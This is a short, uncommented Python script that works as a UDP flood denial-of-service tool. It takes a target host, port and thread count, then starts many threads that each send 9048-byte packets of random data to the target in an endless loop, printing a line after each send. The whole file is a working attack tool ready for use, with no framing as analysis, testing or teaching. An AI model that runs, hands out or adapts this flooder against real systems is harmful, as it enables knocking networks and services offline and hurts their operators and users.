import os
import sys
import time
import socket
import random
import threading

def main():
  tg = str(sys.argv[1])
  tg = socket.gethostbyname(tg)
  po = int(sys.argv[2])
  th = int(sys.argv[3])
  for x in range(th):
    t = threading.Thread(target=etek, args=(tg,po,))
    t.start()

def etek(ip, port):
  pkt = random._urandom(9048)
  s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
  s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
  while True:
    try:
      s.connect((ip, port))
      s.send(pkt)
      print("Sending 9048 Packets to => "+str(ip)+":"+str(port))
    except socket.error:
      s.close()
    except KeyboardInterrupt:
      break
    except:
      pass

if __name__ == "__main__":
  main()
